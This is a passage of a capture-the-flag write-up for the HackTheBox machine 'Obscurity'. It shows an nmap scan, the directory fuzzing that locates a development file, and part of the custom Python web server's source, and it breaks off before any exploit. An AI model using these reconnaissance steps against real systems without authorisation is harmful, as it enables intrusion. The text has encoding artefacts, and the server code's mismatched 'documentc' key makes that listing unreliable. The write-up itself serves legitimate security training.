I"K∞<style>
.time {
    text-align: center;
    margin-top: 30px;
    font-family: 'Open Sans', sans-serif;
    font-weight: 300;
    font-style: normal;
}
</style>

<p class="time">30 Nov 2019 | Reading time: ~7 min</p>

<h1 align="center">HackTheBox - Obscurity [Medium] </h1>

<p class="time" style="font-size: 75%;">

#HackTheBox

#Medium

#code-review

#reversing

#python-coding

#cracking-shadow-file

#custom-exploitation

#B2R

</p>

<p><img src="/assets/images/Screenshots/Obscurity//iconTable.png" alt="iconTable" /></p>

<hr />

<h2 class="no_toc text-delta" id="table-of-contents">Table of contents</h2>

<ol id="markdown-toc">
  <li><a href="#improved-skills" id="markdown-toc-improved-skills">Improved skills:</a></li>
  <li><a href="#used-tools" id="markdown-toc-used-tools">Used tools:</a></li>
  <li><a href="#introduction--foothold" id="markdown-toc-introduction--foothold">Introduction &amp; Foothold</a></li>
  <li><a href="#lateral-movement-to-robert" id="markdown-toc-lateral-movement-to-robert">Lateral movement to Robert</a></li>
  <li><a href="#privilege-escalation" id="markdown-toc-privilege-escalation">Privilege Escalation</a></li>
  <li><a href="#trophy" id="markdown-toc-trophy">Trophy</a></li>
</ol>
<hr />

<h3 id="improved-skills">Improved skills:</h3>

<ul>
  <li>Code review</li>
  <li>Reversing</li>
  <li>Python coding</li>
  <li>Cracking shadow file</li>
</ul>

<h3 id="used-tools">Used tools:</h3>

<ul>
  <li>nmap</li>
  <li>owasp zap</li>
  <li>python</li>
  <li>john</li>
</ul>

<hr />

<h2 id="introduction--foothold">Introduction &amp; Foothold</h2>

<p>Obscurity is a medium difficulty Linux machine, containing completely <em>custom components</em>, which respects the proverb <em>‚ÄúSecurity through Obscurity‚Äù</em>.</p>

<p>Let‚Äôs start as always with a <strong>nmap</strong> port scan:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nmap <span class="nt">-A</span> <span class="nt">-O</span> <span class="nt">--script</span><span class="o">=</span>banner <span class="nt">-o</span> nmap.txt 10.10.10.168
<span class="c"># Nmap 7.80 scan initiated Fri Feb 21 22:01:19 2020 as: nmap -A -O --script=banner -o nmap.txt 10.10.10.168</span>
Nmap scan report <span class="k">for </span>10.10.10.168
Host is up <span class="o">(</span>0.048s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 996 filtered ports
PORT     STATE  SERVICE    VERSION
22/tcp   open   ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
|_banner: SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3
8080/tcp open   http-proxy BadHTTPServer
| fingerprint-strings:
|   GetRequest, HTTPOptions:
|     HTTP/1.1 200 OK
|     Date: Fri, 21 Feb 2020 21:03:21
|     Server: BadHTTPServer
|     Last-Modified: Fri, 21 Feb 2020 21:03:21
|     Content-Length: 4171
|     Content-Type: text/html
|     Connection: Closed
|     &lt;<span class="o">!</span>DOCTYPE html&gt;
|     &lt;html <span class="nv">lang</span><span class="o">=</span><span class="s2">"en"</span><span class="o">&gt;</span>
|     &lt;<span class="nb">head</span><span class="o">&gt;</span>
|     &lt;meta <span class="nv">charset</span><span class="o">=</span><span class="s2">"utf-8"</span><span class="o">&gt;</span>
|     &lt;title&gt;0bscura&lt;/title&gt;
|     &lt;meta http-equiv<span class="o">=</span><span class="s2">"X-UA-Compatible"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"IE=Edge"</span><span class="o">&gt;</span>
|     &lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">"viewport"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"width=device-width, initial-scale=1"</span><span class="o">&gt;</span>
|     &lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">"keywords"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">""</span><span class="o">&gt;</span>
|     &lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">"description"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">""</span><span class="o">&gt;</span>
|     &lt;<span class="o">!</span><span class="nt">--</span>
|     Easy Profile Template
|     http://www.templatemo.com/tm-467-easy-profile
|     &lt;<span class="o">!</span><span class="nt">--</span> stylesheet css <span class="nt">--</span><span class="o">&gt;</span>
|     &lt;<span class="nb">link </span><span class="nv">rel</span><span class="o">=</span><span class="s2">"stylesheet"</span> <span class="nv">href</span><span class="o">=</span><span class="s2">"css/bootstrap.min.css"</span><span class="o">&gt;</span>
|     &lt;<span class="nb">link </span><span class="nv">rel</span><span class="o">=</span><span class="s2">"stylesheet"</span> <span class="nv">href</span><span class="o">=</span><span class="s2">"css/font-awesome.min.css"</span><span class="o">&gt;</span>
|     &lt;<span class="nb">link </span><span class="nv">rel</span><span class="o">=</span><span class="s2">"stylesheet"</span> <span class="nv">href</span><span class="o">=</span><span class="s2">"css/templatemo-blue.css"</span><span class="o">&gt;</span>
|     &lt;/head&gt;
|     &lt;body data-spy<span class="o">=</span><span class="s2">"scroll"</span> data-target<span class="o">=</span><span class="s2">".navbar-collapse"</span><span class="o">&gt;</span>
|     &lt;<span class="o">!</span><span class="nt">--</span> preloader section <span class="nt">--</span><span class="o">&gt;</span>
|     &lt;<span class="o">!</span><span class="nt">--</span>
|     &lt;div <span class="nv">class</span><span class="o">=</span><span class="s2">"preloader"</span><span class="o">&gt;</span>
|_    &lt;div <span class="nv">class</span><span class="o">=</span><span class="s2">"sk-spinner sk-spinner-wordpress"</span><span class="o">&gt;</span>
|_http-server-header: BadHTTPServer
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V<span class="o">=</span>7.80%I<span class="o">=</span>7%D<span class="o">=</span>2/21%Time<span class="o">=</span>5E50452A%P<span class="o">=</span>x86_64-pc-linux-gnu%r<span class="o">(</span>Ge
SF:tRequest,10FC,<span class="s2">"HTTP/1</span><span class="se">\.</span><span class="s2">1</span><span class="se">\x</span><span class="s2">20200</span><span class="se">\x</span><span class="s2">20OK</span><span class="se">\n</span><span class="s2">Date:</span><span class="se">\x</span><span class="s2">20Fri,</span><span class="se">\x</span><span class="s2">2021</span><span class="se">\x</span><span class="s2">20Feb</span><span class="se">\x</span><span class="s2">2020
SF:20</span><span class="se">\x</span><span class="s2">2021:03:21</span><span class="se">\n</span><span class="s2">Server:</span><span class="se">\x</span><span class="s2">20BadHTTPServer</span><span class="se">\n</span><span class="s2">Last-Modified:</span><span class="se">\x</span><span class="s2">20Fri,</span><span class="se">\x</span><span class="s2">2021</span><span class="se">\</span><span class="s2">
SF:x20Feb</span><span class="se">\x</span><span class="s2">202020</span><span class="se">\x</span><span class="s2">2021:03:21</span><span class="se">\n</span><span class="s2">Content-Length:</span><span class="se">\x</span><span class="s2">204171</span><span class="se">\n</span><span class="s2">Content-Type:</span><span class="se">\x</span><span class="s2">20t
SF:ext/html</span><span class="se">\n</span><span class="s2">Connection:</span><span class="se">\x</span><span class="s2">20Closed</span><span class="se">\n\n</span><span class="s2">&lt;!DOCTYPE</span><span class="se">\x</span><span class="s2">20html&gt;</span><span class="se">\n</span><span class="s2">&lt;html</span><span class="se">\x</span><span class="s2">20lang=</span><span class="se">\"</span><span class="s2">
SF:en</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n</span><span class="s2">&lt;head&gt;</span><span class="se">\n\t</span><span class="s2">&lt;meta</span><span class="se">\x</span><span class="s2">20charset=</span><span class="se">\"</span><span class="s2">utf-8</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n\t</span><span class="s2">&lt;title&gt;0bscura&lt;/title&gt;</span><span class="se">\</span><span class="s2">
SF:n</span><span class="se">\t</span><span class="s2">&lt;meta</span><span class="se">\x</span><span class="s2">20http-equiv=</span><span class="se">\"</span><span class="s2">X-UA-Compatible</span><span class="se">\"\x</span><span class="s2">20content=</span><span class="se">\"</span><span class="s2">IE=Edge</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n\t</span><span class="s2">&lt;
SF:meta</span><span class="se">\x</span><span class="s2">20name=</span><span class="se">\"</span><span class="s2">viewport</span><span class="se">\"\x</span><span class="s2">20content=</span><span class="se">\"</span><span class="s2">width=device-width,</span><span class="se">\x</span><span class="s2">20initial-s
SF:cale=1</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n\t</span><span class="s2">&lt;meta</span><span class="se">\x</span><span class="s2">20name=</span><span class="se">\"</span><span class="s2">keywords</span><span class="se">\"\x</span><span class="s2">20content=</span><span class="se">\"\"</span><span class="s2">&gt;</span><span class="se">\n\t</span><span class="s2">&lt;meta</span><span class="se">\x</span><span class="s2">20na
SF:me=</span><span class="se">\"</span><span class="s2">description</span><span class="se">\"\x</span><span class="s2">20content=</span><span class="se">\"\"</span><span class="s2">&gt;</span><span class="se">\n</span><span class="s2">&lt;!--</span><span class="se">\x</span><span class="s2">20</span><span class="se">\n</span><span class="s2">Easy</span><span class="se">\x</span><span class="s2">20Profile</span><span class="se">\x</span><span class="s2">20Templ
SF:ate</span><span class="se">\n</span><span class="s2">http://www</span><span class="se">\.</span><span class="s2">templatemo</span><span class="se">\.</span><span class="s2">com/tm-467-easy-profile</span><span class="se">\n</span><span class="s2">--&gt;</span><span class="se">\n\t</span><span class="s2">&lt;!--</span><span class="se">\x</span><span class="s2">20st
SF:ylesheet</span><span class="se">\x</span><span class="s2">20css</span><span class="se">\x</span><span class="s2">20--&gt;</span><span class="se">\n\t</span><span class="s2">&lt;link</span><span class="se">\x</span><span class="s2">20rel=</span><span class="se">\"</span><span class="s2">stylesheet</span><span class="se">\"\x</span><span class="s2">20href=</span><span class="se">\"</span><span class="s2">css/boo
SF:tstrap</span><span class="se">\.</span><span class="s2">min</span><span class="se">\.</span><span class="s2">css</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n\t</span><span class="s2">&lt;link</span><span class="se">\x</span><span class="s2">20rel=</span><span class="se">\"</span><span class="s2">stylesheet</span><span class="se">\"\x</span><span class="s2">20href=</span><span class="se">\"</span><span class="s2">css/font-a
SF:wesome</span><span class="se">\.</span><span class="s2">min</span><span class="se">\.</span><span class="s2">css</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n\t</span><span class="s2">&lt;link</span><span class="se">\x</span><span class="s2">20rel=</span><span class="se">\"</span><span class="s2">stylesheet</span><span class="se">\"\x</span><span class="s2">20href=</span><span class="se">\"</span><span class="s2">css/templa
SF:temo-blue</span><span class="se">\.</span><span class="s2">css</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n</span><span class="s2">&lt;/head&gt;</span><span class="se">\n</span><span class="s2">&lt;body</span><span class="se">\x</span><span class="s2">20data-spy=</span><span class="se">\"</span><span class="s2">scroll</span><span class="se">\"\x</span><span class="s2">20data-target
SF:=</span><span class="se">\"\.</span><span class="s2">navbar-collapse</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n\n</span><span class="s2">&lt;!--</span><span class="se">\x</span><span class="s2">20preloader</span><span class="se">\x</span><span class="s2">20section</span><span class="se">\x</span><span class="s2">20--&gt;</span><span class="se">\n</span><span class="s2">&lt;!--</span><span class="se">\n</span><span class="s2">&lt;
SF:div</span><span class="se">\x</span><span class="s2">20class=</span><span class="se">\"</span><span class="s2">preloader</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n\t</span><span class="s2">&lt;div</span><span class="se">\x</span><span class="s2">20class=</span><span class="se">\"</span><span class="s2">sk-spinner</span><span class="se">\x</span><span class="s2">20sk-spinner
SF:-wordpress</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>HTTPOptions,10FC,<span class="s2">"HTTP/1</span><span class="se">\.</span><span class="s2">1</span><span class="se">\x</span><span class="s2">20200</span><span class="se">\x</span><span class="s2">20OK</span><span class="se">\n</span><span class="s2">Date:</span><span class="se">\x</span><span class="s2">20
SF:Fri,</span><span class="se">\x</span><span class="s2">2021</span><span class="se">\x</span><span class="s2">20Feb</span><span class="se">\x</span><span class="s2">202020</span><span class="se">\x</span><span class="s2">2021:03:21</span><span class="se">\n</span><span class="s2">Server:</span><span class="se">\x</span><span class="s2">20BadHTTPServer</span><span class="se">\n</span><span class="s2">Last-M
SF:odified:</span><span class="se">\x</span><span class="s2">20Fri,</span><span class="se">\x</span><span class="s2">2021</span><span class="se">\x</span><span class="s2">20Feb</span><span class="se">\x</span><span class="s2">202020</span><span class="se">\x</span><span class="s2">2021:03:21</span><span class="se">\n</span><span class="s2">Content-Length:</span><span class="se">\x</span><span class="s2">204
SF:171</span><span class="se">\n</span><span class="s2">Content-Type:</span><span class="se">\x</span><span class="s2">20text/html</span><span class="se">\n</span><span class="s2">Connection:</span><span class="se">\x</span><span class="s2">20Closed</span><span class="se">\n\n</span><span class="s2">&lt;!DOCTYPE</span><span class="se">\x</span><span class="s2">20
SF:html&gt;</span><span class="se">\n</span><span class="s2">&lt;html</span><span class="se">\x</span><span class="s2">20lang=</span><span class="se">\"</span><span class="s2">en</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n</span><span class="s2">&lt;head&gt;</span><span class="se">\n\t</span><span class="s2">&lt;meta</span><span class="se">\x</span><span class="s2">20charset=</span><span class="se">\"</span><span class="s2">utf-8</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n\t</span><span class="s2">
SF:&lt;title&gt;0bscura&lt;/title&gt;</span><span class="se">\n\t</span><span class="s2">&lt;meta</span><span class="se">\x</span><span class="s2">20http-equiv=</span><span class="se">\"</span><span class="s2">X-UA-Compatible</span><span class="se">\"\x</span><span class="s2">20co
SF:ntent=</span><span class="se">\"</span><span class="s2">IE=Edge</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n\t</span><span class="s2">&lt;meta</span><span class="se">\x</span><span class="s2">20name=</span><span class="se">\"</span><span class="s2">viewport</span><span class="se">\"\x</span><span class="s2">20content=</span><span class="se">\"</span><span class="s2">width=dev
SF:ice-width,</span><span class="se">\x</span><span class="s2">20initial-scale=1</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n\t</span><span class="s2">&lt;meta</span><span class="se">\x</span><span class="s2">20name=</span><span class="se">\"</span><span class="s2">keywords</span><span class="se">\"\x</span><span class="s2">20conte
SF:nt=</span><span class="se">\"\"</span><span class="s2">&gt;</span><span class="se">\n\t</span><span class="s2">&lt;meta</span><span class="se">\x</span><span class="s2">20name=</span><span class="se">\"</span><span class="s2">description</span><span class="se">\"\x</span><span class="s2">20content=</span><span class="se">\"\"</span><span class="s2">&gt;</span><span class="se">\n</span><span class="s2">&lt;!--</span><span class="se">\x</span><span class="s2">20</span><span class="se">\n</span><span class="s2">E
SF:asy</span><span class="se">\x</span><span class="s2">20Profile</span><span class="se">\x</span><span class="s2">20Template</span><span class="se">\n</span><span class="s2">http://www</span><span class="se">\.</span><span class="s2">templatemo</span><span class="se">\.</span><span class="s2">com/tm-467-easy-pro
SF:file</span><span class="se">\n</span><span class="s2">--&gt;</span><span class="se">\n\t</span><span class="s2">&lt;!--</span><span class="se">\x</span><span class="s2">20stylesheet</span><span class="se">\x</span><span class="s2">20css</span><span class="se">\x</span><span class="s2">20--&gt;</span><span class="se">\n\t</span><span class="s2">&lt;link</span><span class="se">\x</span><span class="s2">20rel=</span><span class="se">\"</span><span class="s2">stylesh
SF:eet</span><span class="se">\"\x</span><span class="s2">20href=</span><span class="se">\"</span><span class="s2">css/bootstrap</span><span class="se">\.</span><span class="s2">min</span><span class="se">\.</span><span class="s2">css</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n\t</span><span class="s2">&lt;link</span><span class="se">\x</span><span class="s2">20rel=</span><span class="se">\"</span><span class="s2">stylesheet
SF:</span><span class="se">\"\x</span><span class="s2">20href=</span><span class="se">\"</span><span class="s2">css/font-awesome</span><span class="se">\.</span><span class="s2">min</span><span class="se">\.</span><span class="s2">css</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n\t</span><span class="s2">&lt;link</span><span class="se">\x</span><span class="s2">20rel=</span><span class="se">\"</span><span class="s2">stylesheet
SF:</span><span class="se">\"\x</span><span class="s2">20href=</span><span class="se">\"</span><span class="s2">css/templatemo-blue</span><span class="se">\.</span><span class="s2">css</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n</span><span class="s2">&lt;/head&gt;</span><span class="se">\n</span><span class="s2">&lt;body</span><span class="se">\x</span><span class="s2">20data-spy=</span><span class="se">\"</span><span class="s2">
SF:scroll</span><span class="se">\"\x</span><span class="s2">20data-target=</span><span class="se">\"\.</span><span class="s2">navbar-collapse</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n\n</span><span class="s2">&lt;!--</span><span class="se">\x</span><span class="s2">20preloader</span><span class="se">\x</span><span class="s2">20
SF:section</span><span class="se">\x</span><span class="s2">20--&gt;</span><span class="se">\n</span><span class="s2">&lt;!--</span><span class="se">\n</span><span class="s2">&lt;div</span><span class="se">\x</span><span class="s2">20class=</span><span class="se">\"</span><span class="s2">preloader</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n\t</span><span class="s2">&lt;div</span><span class="se">\x</span><span class="s2">20class=</span><span class="se">\"</span><span class="s2">s
SF:k-spinner</span><span class="se">\x</span><span class="s2">20sk-spinner-wordpress</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n</span><span class="s2">--&gt;"</span><span class="o">)</span><span class="p">;</span>
Aggressive OS guesses: Linux 3.2 - 4.9 <span class="o">(</span>94%<span class="o">)</span>, Linux 3.1 <span class="o">(</span>93%<span class="o">)</span>, Linux 3.2 <span class="o">(</span>93%<span class="o">)</span>, Linux 3.18 <span class="o">(</span>92%<span class="o">)</span>, AXIS 210A or 211 Network Camera <span class="o">(</span>Linux 2.6.17<span class="o">)</span> <span class="o">(</span>92%<span class="o">)</span>, Linux 3.16 <span class="o">(</span>91%<span class="o">)</span>, Crestron XPanel control system <span class="o">(</span>91%<span class="o">)</span>, Adtran 424RG FTTH gateway <span class="o">(</span>90%<span class="o">)</span>, Linux 2.6.32 <span class="o">(</span>90%<span class="o">)</span>, Linux 3.1 - 3.2 <span class="o">(</span>90%<span class="o">)</span>
No exact OS matches <span class="k">for </span>host <span class="o">(</span><span class="nb">test </span>conditions non-ideal<span class="o">)</span><span class="nb">.</span>
Network Distance: 2 hops
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

TRACEROUTE <span class="o">(</span>using port 80/tcp<span class="o">)</span>
HOP RTT      ADDRESS
1   47.56 ms 10.10.14.1
2   47.70 ms 10.10.10.168

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
<span class="c"># Nmap done at Fri Feb 21 22:01:52 2020 -- 1 IP address (1 host up) scanned in 33.43 seconds</span>
</code></pre></div></div>

<p>We find port 22 open, with <em>OpenSSH 7.6p1</em>, and port 8080, with <strong>BadHTTPServer</strong>, a completely <strong>custom web server</strong>.
Visiting the content of the web server we find a series of static pages, apparently useless, but one of which containing a message for the developers:</p>

<p><img src="/assets/images/Screenshots/Obscurity//Screenshot_2020-02-22_18-28-59.png" alt="Screenshot_2020-02-22_18-28-59" /></p>

<p>We know that there is a <strong>developement folder</strong> containing the <strong>SuperSecureServer.py</strong> file‚Ä¶ let‚Äôs find it!
We can use any fuzzing program, such as <strong>wfuzz</strong>, <strong>ffuf</strong>, <strong>zaproxy</strong> etc ‚Ä¶</p>

<p><img src="/assets/images/Screenshots/Obscurity//Screenshot_2020-02-22_18-55-59.png" alt="Screenshot_2020-02-22_18-55-59" /></p>

<p>We find that the correct URL is http://10.10.10.168:8080/develop/SuperSecureServer.py and the content of the file is the following:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">socket</span>
<span class="kn">import</span> <span class="nn">threading</span>
<span class="kn">from</span> <span class="nn">datetime</span> <span class="kn">import</span> <span class="n">datetime</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">mimetypes</span>
<span class="kn">import</span> <span class="nn">urllib.parse</span>
<span class="kn">import</span> <span class="nn">subprocess</span>

<span class="n">respTemplate</span> <span class="o">=</span> <span class="s">"""HTTP/1.1 {statusNum} {statusCode}
Date: {dateSent}
Server: {server}
Last-Modified: {modified}
Content-Length: {length}
Content-Type: {contentType}
Connection: {connectionType}

{body}
"""</span>
<span class="n">DOC_ROOT</span> <span class="o">=</span> <span class="s">"DocRoot"</span>

<span class="n">CODES</span> <span class="o">=</span> <span class="p">{</span><span class="s">"200"</span><span class="p">:</span> <span class="s">"OK"</span><span class="p">,</span>
        <span class="s">"304"</span><span class="p">:</span> <span class="s">"NOT MODIFIED"</span><span class="p">,</span>
        <span class="s">"400"</span><span class="p">:</span> <span class="s">"BAD REQUEST"</span><span class="p">,</span> <span class="s">"401"</span><span class="p">:</span> <span class="s">"UNAUTHORIZED"</span><span class="p">,</span> <span class="s">"403"</span><span class="p">:</span> <span class="s">"FORBIDDEN"</span><span class="p">,</span> <span class="s">"404"</span><span class="p">:</span> <span class="s">"NOT FOUND"</span><span class="p">,</span>
        <span class="s">"500"</span><span class="p">:</span> <span class="s">"INTERNAL SERVER ERROR"</span><span class="p">}</span>

<span class="n">MIMES</span> <span class="o">=</span> <span class="p">{</span><span class="s">"txt"</span><span class="p">:</span> <span class="s">"text/plain"</span><span class="p">,</span> <span class="s">"css"</span><span class="p">:</span><span class="s">"text/css"</span><span class="p">,</span> <span class="s">"html"</span><span class="p">:</span><span class="s">"text/html"</span><span class="p">,</span> <span class="s">"png"</span><span class="p">:</span> <span class="s">"image/png"</span><span class="p">,</span> <span class="s">"jpg"</span><span class="p">:</span><span class="s">"image/jpg"</span><span class="p">,</span>
        <span class="s">"ttf"</span><span class="p">:</span><span class="s">"application/octet-stream"</span><span class="p">,</span><span class="s">"otf"</span><span class="p">:</span><span class="s">"application/octet-stream"</span><span class="p">,</span> <span class="s">"woff"</span><span class="p">:</span><span class="s">"font/woff"</span><span class="p">,</span> <span class="s">"woff2"</span><span class="p">:</span> <span class="s">"font/woff2"</span><span class="p">,</span>
        <span class="s">"js"</span><span class="p">:</span><span class="s">"application/javascript"</span><span class="p">,</span><span class="s">"gz"</span><span class="p">:</span><span class="s">"application/zip"</span><span class="p">,</span> <span class="s">"py"</span><span class="p">:</span><span class="s">"text/plain"</span><span class="p">,</span> <span class="s">"map"</span><span class="p">:</span> <span class="s">"application/octet-stream"</span><span class="p">}</span>


<span class="k">class</span> <span class="nc">Response</span><span class="p">:</span>
    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">__dict__</span><span class="p">.</span><span class="n">update</span><span class="p">(</span><span class="n">kwargs</span><span class="p">)</span>
        <span class="n">now</span> <span class="o">=</span> <span class="n">datetime</span><span class="p">.</span><span class="n">now</span><span class="p">()</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">dateSent</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">modified</span> <span class="o">=</span> <span class="n">now</span><span class="p">.</span><span class="n">strftime</span><span class="p">(</span><span class="s">"%a, %d %b %Y %H:%M:%S"</span><span class="p">)</span>
    <span class="k">def</span> <span class="nf">stringResponse</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="k">return</span> <span class="n">respTemplate</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="o">**</span><span class="bp">self</span><span class="p">.</span><span class="n">__dict__</span><span class="p">)</span>

<span class="k">class</span> <span class="nc">Request</span><span class="p">:</span>
    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">request</span><span class="p">):</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">good</span> <span class="o">=</span> <span class="bp">True</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">request</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">parseRequest</span><span class="p">(</span><span class="n">request</span><span class="p">)</span>
            <span class="bp">self</span><span class="p">.</span><span class="n">method</span> <span class="o">=</span> <span class="n">request</span><span class="p">[</span><span class="s">"method"</span><span class="p">]</span>
            <span class="bp">self</span><span class="p">.</span><span class="n">doc</span> <span class="o">=</span> <span class="n">request</span><span class="p">[</span><span class="s">"documentc"</span><span class="p">]</span>
            <span class="bp">self</span><span class="p">.</span><span class="n">vers</span> <span class="o">=</span> <span class="n">request</span><span class="p">[</span><span class="s">"vers"</span><span class="p">]</span>
            <span class="bp">self</span><span class="p">.</span><span class="n">header</span> <span class="o">=</span> <span class="n">request</span><span class="p">[</span><span class="s">"header"</span><span class="p">]</span>
            <span class="bp">self</span><span class="p">.</span><span class="n">body</span> <span class="o">=</span> <span class="n">request</span><span class="p">[</span><span class="s">"body"</span><span class="p">]</span>
        <span class="k">except</span><span class="p">:</span>
            <span class="bp">self</span><span class="p">.</span><span class="n">good</span> <span class="o">=</span> <span class="bp">False</span>

    <span class="k">def</span> <span class="nf">parseRequest</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">request</span><span class="p">):</span>       
        <span class="n">req</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">strip</span><span class="p">(</span><span class="s">"</span><span class="se">\r</span><span class="s">"</span><span class="p">).</span><span class="n">split</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
        <span class="n">method</span><span class="p">,</span><span class="n">doc</span><span class="p">,</span><span class="n">vers</span> <span class="o">=</span> <span class="n">req</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">split</span><span class="p">(</span><span class="s">" "</span><span class="p">)</span>
        <span class="n">header</span> <span class="o">=</span> <span class="n">req</span><span class="p">[</span><span class="mi">1</span><span class="p">:</span><span class="o">-</span><span class="mi">3</span><span class="p">]</span>
        <span class="n">body</span> <span class="o">=</span> <span class="n">req</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
        <span class="n">headerDict</span> <span class="o">=</span> <span class="p">{}</span>
        <span class="k">for</span> <span class="n">param</span> <span class="ow">in</span> <span class="n">header</span><span class="p">:</span>
            <span class="n">pos</span> <span class="o">=</span> <span class="n">param</span><span class="p">.</span><span class="n">find</span><span class="p">(</span><span class="s">": "</span><span class="p">)</span>
            <span class="n">key</span><span class="p">,</span> <span class="n">val</span> <span class="o">=</span> <span class="n">param</span><span class="p">[:</span><span class="n">pos</span><span class="p">],</span> <span class="n">param</span><span class="p">[</span><span class="n">pos</span><span class="o">+</span><span class="mi">2</span><span class="p">:]</span>
            <span class="n">headerDict</span><span class="p">.</span><span class="n">update</span><span class="p">({</span><span class="n">key</span><span class="p">:</span> <span class="n">val</span><span class="p">})</span>
        <span class="k">return</span> <span class="p">{</span><span class="s">"method"</span><span class="p">:</span> <span class="n">method</span><span class="p">,</span> <span class="s">"doc"</span><span class="p">:</span> <span class="n">doc</span><span class="p">,</span> <span class="s">"vers"</span><span class="p">:</span> <span class="n">vers</span><span class="p">,</span> <span class="s">"header"</span><span class="p">:</span> <span class="n">headerDict</span><span class="p">,</span> <span class="s">"body"</span><span class="p">:</span> <span class="n">body</span><span class="p">}</span>


<span class="k">class</span> <span class="nc">Server</span><span class="p">:</span>
    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">):</span>   
        <span class="bp">self</span><span class="p">.</span><span class="n">host</span> <span class="o">=</span> <span class="n">host</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">port</span> <span class="o">=</span> <span class="n">port</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">sock</span><span class="p">.</span><span class="n">setsockopt</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">SOL_SOCKET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SO_REUSEADDR</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">sock</span><span class="p">.</span><span class="n">bind</span><span class="p">((</span><span class="bp">self</span><span class="p">.</span><span class="n">host</span><span class="p">,</span> <span class="bp">self</span><span class="p">.</span><span class="n">port</span><span class="p">))</span>

    <span class="k">def</span> <span class="nf">listen</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">sock</span><span class="p">.</span><span class="n">listen</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
        <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
            <span class="n">client</span><span class="p">,</span> <span class="n">address</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">sock</span><span class="p">.</span><span class="n">accept</span><span class="p">()</span>
            <span class="n">client</span><span class="p">.</span><span class="n">settimeout</span><span class="p">(</span><span class="mi">60</span><span class="p">)</span>
